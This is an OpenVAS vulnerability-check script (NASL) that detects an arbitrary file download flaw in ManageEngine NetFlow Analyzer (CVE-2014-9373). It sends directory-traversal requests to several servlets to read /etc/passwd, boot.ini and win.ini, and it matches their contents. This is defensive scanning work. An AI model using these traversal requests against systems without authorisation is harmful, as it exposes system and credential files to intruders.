###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_NetFlow_Analyzer_lfi_12_14.nasl 11105 2018-08-24 12:23:44Z mmartin $
#
# Netflow Analyzer Arbitrary File Download
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105127");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 11105 $");
  script_cve_id("CVE-2014-9373");
  script_bugtraq_id(71640);
  script_name("Netflow Analyzer Arbitrary File Download");
  script_tag(name:"last_modification", value:"$Date: 2018-08-24 14:23:44 +0200 (Fri, 24 Aug 2018) $");
  script_tag(name:"creation_date", value:"2014-12-01 17:20:40 +0200 (Mon, 01 Dec 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://nvd.nist.gov/vuln/detail/CVE-2014-9373");

  script_tag(name:"impact", value:"Arbitrary file download");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response");

  script_tag(name:"solution", value:"Vendor fixes are available. Visit 'https://uploads.zohocorp.com/Internal_Useruploads/dnd/NetFlow_Analyzer/p1982sg3vuo9pibt15p01uju1hv0/consolidated_1Dec.zip'");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"An attacker can exploit this issue using directory-traversal strings to
  view files in the context of the web server process.");

  script_tag(name:"affected", value:"NetFlow v8.6 to v9.9");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

url = '/netflow/jspui/NetworkSnapShot.jsp';

if( ! http_vuln_check( port:port, url:url, pattern:"Login - Netflow Analyzer" ) ) exit( 0 );

files = traversal_files();
urls = make_array();

foreach file( keys( files ) ) {
  urls[ '/netflow/servlet/CSVServlet?schFilePath=/' + files[file] ] = file;
  urls[ '/netflow/servlet/DisplayChartPDF?filename=../../../../../../../../' + files[file] ] = file;
}

urls[ '/netflow/servlet/CReportPDFServlet?schFilePath=C:\\\\boot.ini&pdf=true' ] = '\\[boot loader\\]';
urls[ '/netflow/servlet/CReportPDFServlet?schFilePath=C:\\\\windows\\\\win.ini&pdf=true' ] = 'for 16-bit app support';
urls[ '/netflow/servlet/CReportPDFServlet?schFilePath=/etc/passwd&pdf=true' ] = 'root:.*:0:[01]:';

foreach url( keys( urls ) ) {
  if( http_vuln_check( port:port, url:url, pattern:urls[url] ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
